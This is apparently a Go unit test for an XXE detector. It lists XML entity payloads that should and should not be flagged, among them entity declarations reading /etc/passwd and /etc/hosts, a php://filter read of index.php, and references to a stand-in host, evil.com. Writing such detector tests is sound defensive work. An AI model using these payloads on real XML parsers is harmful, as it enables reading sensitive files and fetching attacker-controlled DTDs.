// Copyright (c) 2026 erik <erik@erik.xyz> — https://erik.xyz

package protocol

import "testing"

func TestXXE(t *testing.T) {
	d := &XXE{}
	if r := d.Detect(""); r == nil || r.Name != "xxe" || r.Detected {
		t.Fatalf("empty input: got %+v, want not-detected xxe result", r)
	}
	tests := []struct {
		input  string
		should bool
	}{
		{`<!ENTITY xxe SYSTEM "file:///etc/passwd">`, true},
		{`<!ENTITY xxe PUBLIC "http://evil.com/xxe">`, true},
		{`<!ENTITY % param SYSTEM "http://evil.com/dtd">`, true},
		{`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>`, true},
		{`<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">`, true},
		{`<!ENTITY xxe SYSTEM "data://text/plain,hello">`, true},
		{`<!ENTITY XXE SYSTEM "file:///etc/passwd">`, true},
		{`%xxe;`, true},
		{`&xxe;`, true},
		{`&file;`, true},
		{`&data;`, true},
		{`normal text`, false},
		{`<xml>hello</xml>`, false},
		{`<!DOCTYPE foo>`, false},
		{`<!ENTITY evil stuff>`, false},
		{`&#65;`, false},
	}
	for _, tc := range tests {
		r := d.Detect(tc.input)
		if r.Detected != tc.should {
			t.Errorf("input=%q: got detected=%v, want %v", tc.input, r.Detected, tc.should)
		}
	}
}
